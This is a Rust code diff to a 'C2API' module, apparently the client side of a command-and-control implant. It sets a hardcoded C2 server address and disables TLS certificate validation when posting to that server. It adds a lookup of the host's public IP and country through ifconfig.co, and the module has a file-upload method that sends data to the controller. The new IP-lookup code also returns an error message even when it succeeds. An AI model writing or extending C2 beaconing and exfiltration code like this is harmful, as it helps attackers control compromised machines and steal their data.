@@ -1,6 +1,6 @@
 use reqwest::{
     blocking::multipart::{Form, Part},
-    Client, Error, Response,
+    Client, Error, Response, ClientBuilder
 };
 use serde_json::{json, Value};
 use std::{
@@ -12,14 +12,12 @@ use std::{
 
 pub struct C2API {
     pub base_url: String,
-    api_client: Client,
 }
 
 impl C2API {
     pub fn new() -> Self {
         C2API {
-            base_url: String::from_str("http://82.66.179.79:5000/api/").unwrap(),
-            api_client: reqwest::Client::new(),
+            base_url: String::from_str("https://192.168.10.121:5000/api/").unwrap()
         }
     }
 
@@ -53,7 +51,7 @@ impl C2API {
                     (String::from("data"), json!({})),
                     (
                         String::from("error"),
-                        json!({"errorMsg": "Something went wrong, good luck lol !"}),
+                        json!({"errorMsg": &error.to_string()}),
                     ),
                 ]);
             }
@@ -61,14 +59,57 @@ impl C2API {
     }
 
     pub async fn post(self, json_body: &Value, uri: &str) -> HashMap<String, Value> {
-        let api_res = self
-            .api_client
+        let client = Client::builder();
+        let api_res = client
+            .danger_accept_invalid_certs(true)
+            .build()
+            .unwrap()
             .post(self.base_url.clone() + &uri)
             .json(json_body)
             .send()
             .await;
 
+
         self.format_response(api_res).await
+    }
+
+    pub async fn get_public_ip_info(self) -> HashMap<String, Value> {
+        let client = Client::new();
+        let response = client.get("https://ifconfig.co/json")
+            .send()
+            .await;
+        match response {
+            Ok(res) => {
+                let res_body: HashMap<String, Value> = match res.json().await {
+                    Ok(json_res) => json_res,
+                    Err(_) => {
+                        HashMap::from([
+                            (String::from("data"), json!({})),
+                            (
+                                String::from("error"),
+                                json!({"errorMsg": "Could not Deserialize response !"}),
+                            ),
+                        ])
+                    }
+                };
+                HashMap::from([
+                    (String::from("data"), json!({"ip": res_body["ip"].to_string(), "country": res_body["country"].to_string()})),
+                    (
+                        String::from("error"),
+                        json!({"errorMsg": "Could not Deserialize response !"}),
+                    ),
+                ])
+            },
+            Err(_) => {
+                HashMap::from([
+                    (String::from("data"), json!({})),
+                    (
+                        String::from("error"),
+                        json!({"errorMsg": "Could not get public ip info !"}),
+                    ),
+                ])
+            }
+        }
     }
 
     pub fn upload_file(
